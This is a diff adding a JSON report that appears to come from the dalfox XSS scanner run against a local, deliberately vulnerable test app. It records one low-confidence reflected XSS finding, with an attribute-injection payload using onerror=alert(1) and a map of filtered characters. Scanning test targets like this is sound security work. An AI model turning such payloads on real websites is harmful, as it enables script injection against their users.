@@ -1,0 +1,72 @@
+{
+  "findings": [
+    {
+      "confidence": "low",
+      "confidence_reason": "payload echoed in the response; no executable position confirmed",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_4?value=%27%20onerror%3Dalert%281%29%20class%3Ddlx1b6d9f20%20src%3Dx%20%27",
+      "detection_method": "reflection",
+      "evidence": "Reflected XSS detected for param value (reflected)",
+      "filter": {
+        "allowed": [
+          "$",
+          "'",
+          "(",
+          ")",
+          "+",
+          ",",
+          "-",
+          ".",
+          "/",
+          ":",
+          ";",
+          "=",
+          "[",
+          "\\",
+          "]",
+          "`",
+          "{",
+          "|",
+          "}"
+        ],
+        "blocked": [],
+        "encoded": [
+          "\"",
+          "<",
+          ">"
+        ]
+      },
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "[R] Triggered XSS Payload (reflected): value=' onerror=alert(1) class=dlx1b6d9f20 src=x '",
+      "method": "GET",
+      "param": "value",
+      "payload": "' onerror=alert(1) class=dlx1b6d9f20 src=x '",
+      "severity": "Info",
+      "type": "R",
+      "type_description": "Reflected - payload appears in the response, but its position was not confirmed exploitable; confirm manually"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.3.0",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 1,
+    "incomplete": false,
+    "scan_duration_ms": 71,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "method": "GET",
+        "status": "findings",
+        "target": "http://127.0.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_4?value=vulnerableapp"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_4?value=vulnerableapp"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 325
+  }
+}
